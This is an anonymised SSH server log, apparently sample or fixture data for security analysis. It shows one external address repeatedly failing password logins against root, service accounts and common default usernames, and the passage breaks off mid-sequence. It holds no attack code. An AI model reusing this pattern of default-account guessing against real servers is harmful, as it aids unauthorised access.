+Sep 22 02:15:51 HOST_1 sshd[27733]: Failed password for invalid user admin from IP_EXT_1 port 37027 ssh2
+Sep 22 02:15:51 HOST_1 sshd[27733]: Connection closed by invalid user admin IP_EXT_1 port 37027 [preauth]
+Sep 22 02:15:52 HOST_1 sshd[24660]: Invalid user test from IP_EXT_1 port 37521
+Sep 22 02:15:53 HOST_1 sshd[24660]: Failed password for invalid user test from IP_EXT_1 port 37521 ssh2
+Sep 22 02:15:53 HOST_1 sshd[24660]: Connection closed by invalid user test IP_EXT_1 port 37521 [preauth]
+Sep 22 02:15:56 HOST_1 sshd[20047]: Invalid user test from IP_EXT_1 port 60336
+Sep 22 02:15:57 HOST_1 sshd[20047]: Failed password for invalid user test from IP_EXT_1 port 60336 ssh2
+Sep 22 02:15:57 HOST_1 sshd[20047]: Connection closed by invalid user test IP_EXT_1 port 60336 [preauth]
+Sep 22 02:16:01 HOST_1 sshd[29695]: Invalid user deploy from IP_EXT_1 port 60563
+Sep 22 02:16:02 HOST_1 sshd[29695]: Failed password for invalid user deploy from IP_EXT_1 port 60563 ssh2
+Sep 22 02:16:02 HOST_1 sshd[29695]: Connection closed by invalid user deploy IP_EXT_1 port 60563 [preauth]
+Sep 22 02:16:06 HOST_1 sshd[20909]: Invalid user nagios from IP_EXT_1 port 34981
+Sep 22 02:16:07 HOST_1 sshd[20909]: Failed password for invalid user nagios from IP_EXT_1 port 34981 ssh2
+Sep 22 02:16:07 HOST_1 sshd[20909]: Connection closed by invalid user nagios IP_EXT_1 port 34981 [preauth]
+Sep 22 02:16:11 HOST_1 sshd[26320]: Failed password for USER_2 from IP_EXT_1 port 60275 ssh2
+Sep 22 02:16:11 HOST_1 sshd[26320]: Connection closed by authenticating user USER_2 IP_EXT_1 port 60275 [preauth]
+Sep 22 02:16:15 HOST_1 sshd[26795]: Failed password for SVC_1 from IP_EXT_1 port 47386 ssh2
+Sep 22 02:16:15 HOST_1 sshd[26795]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 47386 [preauth]
+Sep 22 02:16:19 HOST_1 sshd[26779]: Invalid user ubuntu from IP_EXT_1 port 54296
+Sep 22 02:16:20 HOST_1 sshd[26779]: Failed password for invalid user ubuntu from IP_EXT_1 port 54296 ssh2
+Sep 22 02:16:20 HOST_1 sshd[26779]: Connection closed by invalid user ubuntu IP_EXT_1 port 54296 [preauth]
+Sep 22 02:16:22 HOST_1 sshd[23861]: Invalid user ftpuser from IP_EXT_1 port 33519
+Sep 22 02:16:23 HOST_1 sshd[23861]: Failed password for invalid user ftpuser from IP_EXT_1 port 33519 ssh2
+Sep 22 02:16:23 HOST_1 sshd[23861]: Connection closed by invalid user ftpuser IP_EXT_1 port 33519 [preauth]
+Sep 22 02:16:28 HOST_1 sshd[29683]: Invalid user guest from IP_EXT_1 port 39627
+Sep 22 02:16:29 HOST_1 sshd[29683]: Failed password for invalid user guest from IP_EXT_1 port 39627 ssh2
+Sep 22 02:16:29 HOST_1 sshd[29683]: Connection closed by invalid user guest IP_EXT_1 port 39627 [preauth]
+Sep 22 02:16:34 HOST_1 sshd[29789]: Failed password for USER_1 from IP_EXT_1 port 52010 ssh2
+Sep 22 02:16:34 HOST_1 sshd[29789]: Connection closed by authenticating user USER_1 IP_EXT_1 port 52010 [preauth]
+Sep 22 02:16:35 HOST_1 sshd[25272]: Invalid user test from IP_EXT_1 port 36869
+Sep 22 02:16:36 HOST_1 sshd[25272]: Failed password for invalid user test from IP_EXT_1 port 36869 ssh2
+Sep 22 02:16:36 HOST_1 sshd[25272]: Connection closed by invalid user test IP_EXT_1 port 36869 [preauth]
+Sep 22 02:16:38 HOST_1 sshd[25284]: Failed password for USER_1 from IP_EXT_1 port 34839 ssh2
+Sep 22 02:16:38 HOST_1 sshd[25284]: Connection closed by authenticating user USER_1 IP_EXT_1 port 34839 [preauth]
+Sep 22 02:16:42 HOST_1 sshd[26006]: Invalid user ftpuser from IP_EXT_1 port 36662
+Sep 22 02:16:43 HOST_1 sshd[26006]: Failed password for invalid user ftpuser from IP_EXT_1 port 36662 ssh2
+Sep 22 02:16:43 HOST_1 sshd[26006]: Connection closed by invalid user ftpuser IP_EXT_1 port 36662 [preauth]
+Sep 22 02:16:44 HOST_1 sshd[26145]: Invalid user ubuntu from IP_EXT_1 port 40788
+Sep 22 02:16:45 HOST_1 sshd[26145]: Failed password for invalid user ubuntu from IP_EXT_1 port 40788 ssh2
+Sep 22 02:16:45 HOST_1 sshd[26145]: Connection closed by invalid user ubuntu IP_EXT_1 port 40788 [preauth]
+Sep 22 02:16:50 HOST_1 sshd[24926]: Failed password for USER_2 from IP_EXT_1 port 45650 ssh2
+Sep 22 02:16:50 HOST_1 sshd[24926]: Connection closed by authenticating user USER_2 IP_EXT_1 port 45650 [preauth]
+Sep 22 02:16:54 HOST_1 sshd[24604]: Failed password for SVC_1 from IP_EXT_1 port 42722 ssh2
+Sep 22 02:16:54 HOST_1 sshd[24604]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 42722 [preauth]
+Sep 22 02:16:56 HOST_1 sshd[29739]: Invalid user pi from IP_EXT_1 port 42504
+Sep 22 02:16:57 HOST_1 sshd[29739]: Failed password for invalid user pi from IP_EXT_1 port 42504 ssh2
+Sep 22 02:16:57 HOST_1 sshd[29739]: Connection closed by invalid user pi IP_EXT_1 port 42504 [preauth]
+Sep 22 02:16:58 HOST_1 sshd[29862]: Invalid user postgres from IP_EXT_1 port 60220
+Sep 22 02:16:59 HOST_1 sshd[29862]: Failed password for invalid user postgres from IP_EXT_1 port 60220 ssh2
+Sep 22 02:16:59 HOST_1 sshd[29862]: Connection closed by invalid user postgres IP_EXT_1 port 60220 [preauth]
+Sep 22 02:17:01 HOST_1 sshd[25295]: Failed password for root from IP_EXT_1 port 44030 ssh2
+Sep 22 02:17:01 HOST_1 sshd[25295]: Connection closed by authenticating user root IP_EXT_1 port 44030 [preauth]
+Sep 22 02:17:05 HOST_1 sshd[25932]: Invalid user support from IP_EXT_1 port 50597
+Sep 22 02:17:06 HOST_1 sshd[25932]: Failed password for invalid user support from IP_EXT_1 port 50597 ssh2
+Sep 22 02:17:06 HOST_1 sshd[25932]: Connection closed by invalid user support IP_EXT_1 port 50597 [preauth]
+Sep 22 02:17:06 HOST_1 sshd[25932]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 50597 ssh2 [preauth]
+Sep 22 02:17:11 HOST_1 sshd[22597]: Invalid user ubuntu from IP_EXT_1 port 60412
+Sep 22 02:17:12 HOST_1 sshd[22597]: Failed password for invalid user ubuntu from IP_EXT_1 port 60412 ssh2
+Sep 22 02:17:12 HOST_1 sshd[22597]: Connection closed by invalid user ubuntu IP_EXT_1 port 60412 [preauth]
+Sep 22 02:17:15 HOST_1 sshd[29505]: Invalid user nagios from IP_EXT_1 port 39719
+Sep 22 02:17:16 HOST_1 sshd[29505]: Failed password for invalid user nagios from IP_EXT_1 port 39719 ssh2
+Sep 22 02:17:16 HOST_1 sshd[29505]: Connection closed by invalid user nagios IP_EXT_1 port 39719 [preauth]
+Sep 22 02:17:20 HOST_1 sshd[29921]: Failed password for SVC_1 from IP_EXT_1 port 49501 ssh2
+Sep 22 02:17:20 HOST_1 sshd[29921]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 49501 [preauth]
+Sep 22 02:17:24 HOST_1 sshd[21869]: Failed password for root from IP_EXT_1 port 53109 ssh2
+Sep 22 02:17:24 HOST_1 sshd[21869]: Connection closed by authenticating user root IP_EXT_1 port 53109 [preauth]
+Sep 22 02:17:27 HOST_1 sshd[28494]: Failed password for root from IP_EXT_1 port 45713 ssh2
+Sep 22 02:17:27 HOST_1 sshd[28494]: Connection closed by authenticating user root IP_EXT_1 port 45713 [preauth]
+Sep 22 02:17:31 HOST_1 sshd[25374]: Failed password for USER_2 from IP_EXT_1 port 33352 ssh2
+Sep 22 02:17:31 HOST_1 sshd[25374]: Connection closed by authenticating user USER_2 IP_EXT_1 port 33352 [preauth]
+Sep 22 02:17:35 HOST_1 sshd[27708]: Failed password for USER_2 from IP_EXT_1 port 33304 ssh2
+Sep 22 02:17:35 HOST_1 sshd[27708]: Connection closed by authenticating user USER_2 IP_EXT_1 port 33304 [preauth]
+Sep 22 02:17:39 HOST_1 sshd[26354]: Failed password for root from IP_EXT_1 port 35882 ssh2
+Sep 22 02:17:39 HOST_1 sshd[26354]: Connection closed by authenticating user root IP_EXT_1 port 35882 [preauth]
+Sep 22 02:17:44 HOST_1 sshd[21241]: Invalid user ftpuser from IP_EXT_1 port 53894
+Sep 22 02:17:45 HOST_1 sshd[21241]: Failed password for invalid user ftpuser from IP_EXT_1 port 53894 ssh2
+Sep 22 02:17:45 HOST_1 sshd[21241]: Connection closed by invalid user ftpuser IP_EXT_1 port 53894 [preauth]
+Sep 22 02:17:46 HOST_1 sshd[20961]: Failed password for USER_1 from IP_EXT_1 port 37812 ssh2
+Sep 22 02:17:46 HOST_1 sshd[20961]: Connection closed by authenticating user USER_1 IP_EXT_1 port 37812 [preauth]
+Sep 22 02:17:48 HOST_1 sshd[23061]: Failed password for USER_2 from IP_EXT_1 port 59760 ssh2
+Sep 22 02:17:48 HOST_1 sshd[23061]: Connection closed by authenticating user USER_2 IP_EXT_1 port 59760 [preauth]
+Sep 22 02:17:49 HOST_1 sshd[21188]: Invalid user user from IP_EXT_1 port 44901
+Sep 22 02:17:50 HOST_1 sshd[21188]: Failed password for invalid user user from IP_EXT_1 port 44901 ssh2
+Sep 22 02:17:50 HOST_1 sshd[21188]: Connection closed by invalid user user IP_EXT_1 port 44901 [preauth]
+Sep 22 02:17:53 HOST_1 sshd[21882]: Invalid user test from IP_EXT_1 port 52018
+Sep 22 02:17:54 HOST_1 sshd[21882]: Failed password for invalid user test from IP_EXT_1 port 52018 ssh2
+Sep 22 02:17:54 HOST_1 sshd[21882]: Connection closed by invalid user test IP_EXT_1 port 52018 [preauth]
+Sep 22 02:17:56 HOST_1 sshd[29490]: Failed password for USER_2 from IP_EXT_1 port 34980 ssh2
+Sep 22 02:17:56 HOST_1 sshd[29490]: Connection closed by authenticating user USER_2 IP_EXT_1 port 34980 [preauth]
+Sep 22 02:18:00 HOST_1 sshd[27271]: Invalid user postgres from IP_EXT_1 port 57030
+Sep 22 02:18:01 HOST_1 sshd[27271]: Failed password for invalid user postgres from IP_EXT_1 port 57030 ssh2
+Sep 22 02:18:01 HOST_1 sshd[27271]: Connection closed by invalid user postgres IP_EXT_1 port 57030 [preauth]
+Sep 22 02:18:04 HOST_1 sshd[26813]: Invalid user nagios from IP_EXT_1 port 33111
+Sep 22 02:18:05 HOST_1 sshd[26813]: Failed password for invalid user nagios from IP_EXT_1 port 33111 ssh2
+Sep 22 02:18:05 HOST_1 sshd[26813]: Connection closed by invalid user nagios IP_EXT_1 port 33111 [preauth]
+Sep 22 02:18:08 HOST_1 sshd[29839]: Failed password for root from IP_EXT_1 port 52351 ssh2
+Sep 22 02:18:08 HOST_1 sshd[29839]: Connection closed by authenticating user root IP_EXT_1 port 52351 [preauth]
+Sep 22 02:18:11 HOST_1 sshd[28545]: Invalid user deploy from IP_EXT_1 port 59917
+Sep 22 02:18:12 HOST_1 sshd[28545]: Failed password for invalid user deploy from IP_EXT_1 port 59917 ssh2
+Sep 22 02:18:12 HOST_1 sshd[28545]: Connection closed by invalid user deploy IP_EXT_1 port 59917 [preauth]
+Sep 22 02:18:16 HOST_1 sshd[27061]: Failed password for root from IP_EXT_1 port 55519 ssh2
+Sep 22 02:18:16 HOST_1 sshd[27061]: Connection closed by authenticating user root IP_EXT_1 port 55519 [preauth]
+Sep 22 02:18:18 HOST_1 sshd[27635]: Invalid user backup from IP_EXT_1 port 45607
+Sep 22 02:18:19 HOST_1 sshd[27635]: Failed password for invalid user backup from IP_EXT_1 port 45607 ssh2
+Sep 22 02:18:19 HOST_1 sshd[27635]: Connection closed by invalid user backup IP_EXT_1 port 45607 [preauth]
+Sep 22 02:18:23 HOST_1 sshd[24789]: Invalid user backup from IP_EXT_1 port 55594
+Sep 22 02:18:24 HOST_1 sshd[24789]: Failed password for invalid user backup from IP_EXT_1 port 55594 ssh2
+Sep 22 02:18:24 HOST_1 sshd[24789]: Connection closed by invalid user backup IP_EXT_1 port 55594 [preauth]
+Sep 22 02:18:28 HOST_1 sshd[27803]: Invalid user nagios from IP_EXT_1 port 36312
+Sep 22 02:18:29 HOST_1 sshd[27803]: Failed password for invalid user nagios from IP_EXT_1 port 36312 ssh2
+Sep 22 02:18:29 HOST_1 sshd[27803]: Connection closed by invalid user nagios IP_EXT_1 port 36312 [preauth]
+Sep 22 02:18:32 HOST_1 sshd[24238]: Invalid user support from IP_EXT_1 port 59858
+Sep 22 02:18:33 HOST_1 sshd[24238]: Failed password for invalid user support from IP_EXT_1 port 59858 ssh2
+Sep 22 02:18:33 HOST_1 sshd[24238]: Connection closed by invalid user support IP_EXT_1 port 59858 [preauth]
+Sep 22 02:18:37 HOST_1 sshd[27491]: Invalid user oracle from IP_EXT_1 port 59549
+Sep 22 02:18:38 HOST_1 sshd[27491]: Failed password for invalid user oracle from IP_EXT_1 port 59549 ssh2
+Sep 22 02:18:38 HOST_1 sshd[27491]: Connection closed by invalid user oracle IP_EXT_1 port 59549 [preauth]
+Sep 22 02:18:43 HOST_1 sshd[24374]: Failed password for root from IP_EXT_1 port 37507 ssh2
+Sep 22 02:18:43 HOST_1 sshd[24374]: Connection closed by authenticating user root IP_EXT_1 port 37507 [preauth]
+Sep 22 02:18:45 HOST_1 sshd[24182]: Failed password for SVC_1 from IP_EXT_1 port 52882 ssh2
+Sep 22 02:18:45 HOST_1 sshd[24182]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 52882 [preauth]
+Sep 22 02:18:47 HOST_1 sshd[29532]: Failed password for root from IP_EXT_1 port 58280 ssh2
+Sep 22 02:18:47 HOST_1 sshd[29532]: Connection closed by authenticating user root IP_EXT_1 port 58280 [preauth]
+Sep 22 02:18:50 HOST_1 sshd[23836]: Invalid user git from IP_EXT_1 port 60703
+Sep 22 02:18:51 HOST_1 sshd[23836]: Failed password for invalid user git from IP_EXT_1 port 60703 ssh2
+Sep 22 02:18:51 HOST_1 sshd[23836]: Connection closed by invalid user git IP_EXT_1 port 60703 [preauth]
+Sep 22 02:18:52 HOST_1 sshd[24899]: Failed password for USER_2 from IP_EXT_1 port 58520 ssh2
+Sep 22 02:18:52 HOST_1 sshd[24899]: Connection closed by authenticating user USER_2 IP_EXT_1 port 58520 [preauth]
+Sep 22 02:18:55 HOST_1 sshd[21200]: Invalid user backup from IP_EXT_1 port 56821
+Sep 22 02:18:56 HOST_1 sshd[21200]: Failed password for invalid user backup from IP_EXT_1 port 56821 ssh2
+Sep 22 02:18:56 HOST_1 sshd[21200]: Connection closed by invalid user backup IP_EXT_1 port 56821 [preauth]
+Sep 22 02:19:01 HOST_1 sshd[26270]: Failed password for root from IP_EXT_1 port 48320 ssh2
+Sep 22 02:19:01 HOST_1 sshd[26270]: Connection closed by authenticating user root IP_EXT_1 port 48320 [preauth]
+Sep 22 02:19:03 HOST_1 sshd[21266]: Invalid user zabbix from IP_EXT_1 port 52733
+Sep 22 02:19:04 HOST_1 sshd[21266]: Failed password for invalid user zabbix from IP_EXT_1 port 52733 ssh2
+Sep 22 02:19:04 HOST_1 sshd[21266]: Connection closed by invalid user zabbix IP_EXT_1 port 52733 [preauth]
+Sep 22 02:19:07 HOST_1 sshd[23638]: Failed password for USER_2 from IP_EXT_1 port 54502 ssh2
+Sep 22 02:19:07 HOST_1 sshd[23638]: Connection closed by authenticating user USER_2 IP_EXT_1 port 54502 [preauth]
+Sep 22 02:19:10 HOST_1 sshd[29315]: Failed password for root from IP_EXT_1 port 49603 ssh2
+Sep 22 02:19:10 HOST_1 sshd[29315]: Connection closed by authenticating user root IP_EXT_1 port 49603 [preauth]
+Sep 22 02:19:14 HOST_1 sshd[20164]: Invalid user support from IP_EXT_1 port 44924
+Sep 22 02:19:15 HOST_1 sshd[20164]: Failed password for invalid user support from IP_EXT_1 port 44924 ssh2
+Sep 22 02:19:15 HOST_1 sshd[20164]: Connection closed by invalid user support IP_EXT_1 port 44924 [preauth]
+Sep 22 02:19:19 HOST_1 sshd[23827]: Invalid user admin from IP_EXT_1 port 51997
+Sep 22 02:19:20 HOST_1 sshd[23827]: Failed password for invalid user admin from IP_EXT_1 port 51997 ssh2
+Sep 22 02:19:20 HOST_1 sshd[23827]: Connection closed by invalid user admin IP_EXT_1 port 51997 [preauth]
+Sep 22 02:19:25 HOST_1 sshd[28536]: Failed password for USER_1 from IP_EXT_1 port 37827 ssh2
+Sep 22 02:19:25 HOST_1 sshd[28536]: Connection closed by authenticating user USER_1 IP_EXT_1 port 37827 [preauth]
+Sep 22 02:19:26 HOST_1 sshd[28740]: Invalid user oracle from IP_EXT_1 port 42069
+Sep 22 02:19:27 HOST_1 sshd[28740]: Failed password for invalid user oracle from IP_EXT_1 port 42069 ssh2
+Sep 22 02:19:27 HOST_1 sshd[28740]: Connection closed by invalid user oracle IP_EXT_1 port 42069 [preauth]
+Sep 22 02:19:30 HOST_1 sshd[27232]: Failed password for root from IP_EXT_1 port 56633 ssh2
+Sep 22 02:19:30 HOST_1 sshd[27232]: Connection closed by authenticating user root IP_EXT_1 port 56633 [preauth]
+Sep 22 02:19:31 HOST_1 sshd[28333]: Invalid user user from IP_EXT_1 port 38983
+Sep 22 02:19:32 HOST_1 sshd[28333]: Failed password for invalid user user from IP_EXT_1 port 38983 ssh2
+Sep 22 02:19:32 HOST_1 sshd[28333]: Connection closed by invalid user user IP_EXT_1 port 38983 [preauth]
+Sep 22 02:19:32 HOST_1 sshd[28333]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 38983 ssh2 [preauth]
+Sep 22 02:19:33 HOST_1 sshd[25820]: Invalid user oracle from IP_EXT_1 port 34787
+Sep 22 02:19:34 HOST_1 sshd[25820]: Failed password for invalid user oracle from IP_EXT_1 port 34787 ssh2
+Sep 22 02:19:34 HOST_1 sshd[25820]: Connection closed by invalid user oracle IP_EXT_1 port 34787 [preauth]
+Sep 22 02:19:38 HOST_1 sshd[21003]: Failed password for root from IP_EXT_1 port 59507 ssh2
+Sep 22 02:19:38 HOST_1 sshd[21003]: Connection closed by authenticating user root IP_EXT_1 port 59507 [preauth]
+Sep 22 02:19:40 HOST_1 sshd[27091]: Invalid user ftpuser from IP_EXT_1 port 54020
+Sep 22 02:19:41 HOST_1 sshd[27091]: Failed password for invalid user ftpuser from IP_EXT_1 port 54020 ssh2
+Sep 22 02:19:41 HOST_1 sshd[27091]: Connection closed by invalid user ftpuser IP_EXT_1 port 54020 [preauth]
+Sep 22 02:19:44 HOST_1 sshd[27260]: Invalid user postgres from IP_EXT_1 port 60977
+Sep 22 02:19:45 HOST_1 sshd[27260]: Failed password for invalid user postgres from IP_EXT_1 port 60977 ssh2
+Sep 22 02:19:45 HOST_1 sshd[27260]: Connection closed by invalid user postgres IP_EXT_1 port 60977 [preauth]
+Sep 22 02:19:48 HOST_1 sshd[26999]: Failed password for root from IP_EXT_1 port 53439 ssh2
+Sep 22 02:19:48 HOST_1 sshd[26999]: Connection closed by authenticating user root IP_EXT_1 port 53439 [preauth]
+Sep 22 02:19:49 HOST_1 sshd[20555]: Invalid user ubuntu from IP_EXT_1 port 60562
+Sep 22 02:19:50 HOST_1 sshd[20555]: Failed password for invalid user ubuntu from IP_EXT_1 port 60562 ssh2
+Sep 22 02:19:50 HOST_1 sshd[20555]: Connection closed by invalid user ubuntu IP_EXT_1 port 60562 [preauth]
+Sep 22 02:19:53 HOST_1 sshd[22665]: Failed password for SVC_1 from IP_EXT_1 port 38250 ssh2
+Sep 22 02:19:53 HOST_1 sshd[22665]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 38250 [preauth]
+Sep 22 02:19:57 HOST_1 sshd[25426]: Invalid user postgres from IP_EXT_1 port 44547
+Sep 22 02:19:58 HOST_1 sshd[25426]: Failed password for invalid user postgres from IP_EXT_1 port 44547 ssh2
+Sep 22 02:19:58 HOST_1 sshd[25426]: Connection closed by invalid user postgres IP_EXT_1 port 44547 [preauth]
+Sep 22 02:20:00 HOST_1 sshd[28999]: Failed password for root from IP_EXT_1 port 40703 ssh2
+Sep 22 02:20:00 HOST_1 sshd[28999]: Connection closed by authenticating user root IP_EXT_1 port 40703 [preauth]
+Sep 22 02:20:04 HOST_1 sshd[24218]: Failed password for root from IP_EXT_1 port 46591 ssh2
+Sep 22 02:20:04 HOST_1 sshd[24218]: Connection closed by authenticating user root IP_EXT_1 port 46591 [preauth]
+Sep 22 02:20:06 HOST_1 sshd[23435]: Failed password for root from IP_EXT_1 port 38260 ssh2
+Sep 22 02:20:06 HOST_1 sshd[23435]: Connection closed by authenticating user root IP_EXT_1 port 38260 [preauth]
+Sep 22 02:20:11 HOST_1 sshd[28768]: Invalid user nagios from IP_EXT_1 port 55552
+Sep 22 02:20:12 HOST_1 sshd[28768]: Failed password for invalid user nagios from IP_EXT_1 port 55552 ssh2
+Sep 22 02:20:12 HOST_1 sshd[28768]: Connection closed by invalid user nagios IP_EXT_1 port 55552 [preauth]
+Sep 22 02:20:17 HOST_1 sshd[29983]: Invalid user admin from IP_EXT_1 port 51775
+Sep 22 02:20:18 HOST_1 sshd[29983]: Failed password for invalid user admin from IP_EXT_1 port 51775 ssh2
+Sep 22 02:20:18 HOST_1 sshd[29983]: Connection closed by invalid user admin IP_EXT_1 port 51775 [preauth]
+Sep 22 02:20:19 HOST_1 sshd[26199]: Failed password for USER_1 from IP_EXT_1 port 41431 ssh2
+Sep 22 02:20:19 HOST_1 sshd[26199]: Connection closed by authenticating user USER_1 IP_EXT_1 port 41431 [preauth]
+Sep 22 02:20:24 HOST_1 sshd[26059]: Invalid user support from IP_EXT_1 port 47187
+Sep 22 02:20:25 HOST_1 sshd[26059]: Failed password for invalid user support from IP_EXT_1 port 47187 ssh2
+Sep 22 02:20:25 HOST_1 sshd[26059]: Connection closed by invalid user support IP_EXT_1 port 47187 [preauth]
+Sep 22 02:20:29 HOST_1 sshd[21592]: Failed password for root from IP_EXT_1 port 59414 ssh2
+Sep 22 02:20:29 HOST_1 sshd[21592]: Connection closed by authenticating user root IP_EXT_1 port 59414 [preauth]
+Sep 22 02:20:31 HOST_1 sshd[21227]: Invalid user postgres from IP_EXT_1 port 52793
+Sep 22 02:20:32 HOST_1 sshd[21227]: Failed password for invalid user postgres from IP_EXT_1 port 52793 ssh2
+Sep 22 02:20:32 HOST_1 sshd[21227]: Connection closed by invalid user postgres IP_EXT_1 port 52793 [preauth]
+Sep 22 02:20:37 HOST_1 sshd[20929]: Invalid user test from IP_EXT_1 port 60514
+Sep 22 02:20:38 HOST_1 sshd[20929]: Failed password for invalid user test from IP_EXT_1 port 60514 ssh2
+Sep 22 02:20:38 HOST_1 sshd[20929]: Connection closed by invalid user test IP_EXT_1 port 60514 [preauth]
+Sep 22 02:20:41 HOST_1 sshd[26533]: Invalid user support from IP_EXT_1 port 56659
+Sep 22 02:20:42 HOST_1 sshd[26533]: Failed password for invalid user support from IP_EXT_1 port 56659 ssh2
+Sep 22 02:20:42 HOST_1 sshd[26533]: Connection closed by invalid user support IP_EXT_1 port 56659 [preauth]
+Sep 22 02:20:43 HOST_1 sshd[20708]: Failed password for USER_2 from IP_EXT_1 port 36919 ssh2
+Sep 22 02:20:43 HOST_1 sshd[20708]: Connection closed by authenticating user USER_2 IP_EXT_1 port 36919 [preauth]
+Sep 22 02:20:46 HOST_1 sshd[28758]: Failed password for USER_1 from IP_EXT_1 port 41531 ssh2
+Sep 22 02:20:46 HOST_1 sshd[28758]: Connection closed by authenticating user USER_1 IP_EXT_1 port 41531 [preauth]
+Sep 22 02:20:48 HOST_1 sshd[26496]: Invalid user oracle from IP_EXT_1 port 38492
+Sep 22 02:20:49 HOST_1 sshd[26496]: Failed password for invalid user oracle from IP_EXT_1 port 38492 ssh2
+Sep 22 02:20:49 HOST_1 sshd[26496]: Connection closed by invalid user oracle IP_EXT_1 port 38492 [preauth]
+Sep 22 02:20:50 HOST_1 sshd[22371]: Invalid user guest from IP_EXT_1 port 50354
+Sep 22 02:20:51 HOST_1 sshd[22371]: Failed password for invalid user guest from IP_EXT_1 port 50354 ssh2
+Sep 22 02:20:51 HOST_1 sshd[22371]: Connection closed by invalid user guest IP_EXT_1 port 50354 [preauth]
+Sep 22 02:20:56 HOST_1 sshd[27003]: Failed password for SVC_1 from IP_EXT_1 port 38315 ssh2
+Sep 22 02:20:56 HOST_1 sshd[27003]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 38315 [preauth]
+Sep 22 02:21:01 HOST_1 sshd[28661]: Invalid user guest from IP_EXT_1 port 47408
+Sep 22 02:21:02 HOST_1 sshd[28661]: Failed password for invalid user guest from IP_EXT_1 port 47408 ssh2
+Sep 22 02:21:02 HOST_1 sshd[28661]: Connection closed by invalid user guest IP_EXT_1 port 47408 [preauth]
+Sep 22 02:21:03 HOST_1 sshd[20678]: Invalid user admin from IP_EXT_1 port 39616
+Sep 22 02:21:04 HOST_1 sshd[20678]: Failed password for invalid user admin from IP_EXT_1 port 39616 ssh2
+Sep 22 02:21:04 HOST_1 sshd[20678]: Connection closed by invalid user admin IP_EXT_1 port 39616 [preauth]
+Sep 22 02:21:09 HOST_1 sshd[23319]: Failed password for root from IP_EXT_1 port 47263 ssh2
+Sep 22 02:21:09 HOST_1 sshd[23319]: Connection closed by authenticating user root IP_EXT_1 port 47263 [preauth]
+Sep 22 02:21:12 HOST_1 sshd[27764]: Failed password for root from IP_EXT_1 port 44347 ssh2
+Sep 22 02:21:12 HOST_1 sshd[27764]: Connection closed by authenticating user root IP_EXT_1 port 44347 [preauth]
+Sep 22 02:21:15 HOST_1 sshd[21852]: Failed password for root from IP_EXT_1 port 59471 ssh2
+Sep 22 02:21:15 HOST_1 sshd[21852]: Connection closed by authenticating user root IP_EXT_1 port 59471 [preauth]
+Sep 22 02:21:16 HOST_1 sshd[26099]: Invalid user nagios from IP_EXT_1 port 58729
+Sep 22 02:21:17 HOST_1 sshd[26099]: Failed password for invalid user nagios from IP_EXT_1 port 58729 ssh2
+Sep 22 02:21:17 HOST_1 sshd[26099]: Connection closed by invalid user nagios IP_EXT_1 port 58729 [preauth]
+Sep 22 02:21:19 HOST_1 sshd[27787]: Invalid user support from IP_EXT_1 port 59891
+Sep 22 02:21:20 HOST_1 sshd[27787]: Failed password for invalid user support from IP_EXT_1 port 59891 ssh2
+Sep 22 02:21:20 HOST_1 sshd[27787]: Connection closed by invalid user support IP_EXT_1 port 59891 [preauth]
+Sep 22 02:21:22 HOST_1 sshd[24527]: Failed password for SVC_1 from IP_EXT_1 port 52637 ssh2
+Sep 22 02:21:22 HOST_1 sshd[24527]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 52637 [preauth]
+Sep 22 02:21:23 HOST_1 sshd[22186]: Failed password for root from IP_EXT_1 port 33634 ssh2
+Sep 22 02:21:23 HOST_1 sshd[22186]: Connection closed by authenticating user root IP_EXT_1 port 33634 [preauth]
+Sep 22 02:21:26 HOST_1 sshd[29318]: Failed password for USER_2 from IP_EXT_1 port 56202 ssh2
+Sep 22 02:21:26 HOST_1 sshd[29318]: Connection closed by authenticating user USER_2 IP_EXT_1 port 56202 [preauth]
+Sep 22 02:21:27 HOST_1 sshd[21657]: Failed password for USER_1 from IP_EXT_1 port 41879 ssh2
+Sep 22 02:21:27 HOST_1 sshd[21657]: Connection closed by authenticating user USER_1 IP_EXT_1 port 41879 [preauth]
+Sep 22 02:21:30 HOST_1 sshd[29409]: Failed password for SVC_1 from IP_EXT_1 port 42758 ssh2
+Sep 22 02:21:30 HOST_1 sshd[29409]: Connection closed by authenticating user SVC_1 IP_EXT_1 port 42758 [preauth]
+Sep 22 02:21:33 HOST_1 sshd[21456]: Failed password for USER_2 from IP_EXT_1 port 35397 ssh2
+Sep 22 02:21:33 HOST_1 sshd[21456]: Connection closed by authenticating user USER_2 IP_EXT_1 port 35397 [preauth]
+Sep 22 02:21:34 HOST_1 sshd[23818]: Failed password for root from IP_EXT_1 port 47656 ssh2
+Sep 22 02:21:34 HOST_1 sshd[23818]: Connection closed by authenticating user root IP_EXT_1 port 47656 [preauth]
+Sep 22 02:21:38 HOST_1 sshd[21369]: Invalid user test from IP_EXT_1 port 43433
+Sep 22 02:21:39 HOST_1 sshd[21369]: Failed password for invalid user test from IP_EXT_1 port 43433 ssh2
+Sep 22 02:21:39 HOST_1 sshd[21369]: Connection closed by invalid user test IP_EXT_1 port 43433 [preauth]
+Sep 22 02:21:40 HOST_1 sshd[21612]: Failed password for root from IP_EXT_1 port 58802 ssh2
+Sep 22 02:21:40 HOST_1 sshd[21612]: Connection closed by authenticating user root IP_EXT_1 port 58802 [preauth]
+Sep 22 02:21:40 HOST_1 sshd[21612]: error: maximum authentication attempts exceeded for root from IP_EXT_1 port 58802 ssh2 [preauth]
+Sep 22 02:21:42 HOST_1 sshd[20994]: Invalid user oracle from IP_EXT_1 port 33243
+Sep 22 02:21:43 HOST_1 sshd[20994]: Failed password for invalid user oracle from IP_EXT_1 port 33243 ssh2
+Sep 22 02:21:43 HOST_1 sshd[20994]: Connection closed by invalid user oracle IP_EXT_1 port 33243 [preauth]
+Sep 22 02:21:46 HOST_1 sshd[21417]: Failed password for USER_2 from IP_EXT_1 port 58564 ssh2
+Sep 22 02:21:46 HOST_1 sshd[21417]: Connection closed by authenticating user USER_2 IP_EXT_1 port 58564 [preauth]
+Sep 22 02:21:49 HOST_1 sshd[21841]: Invalid user ubuntu from IP_EXT_1 port 41544
+Sep 22 02:21:50 HOST_1 sshd[21841]: Failed password for invalid user ubuntu from IP_EXT_1 port 41544 ssh2
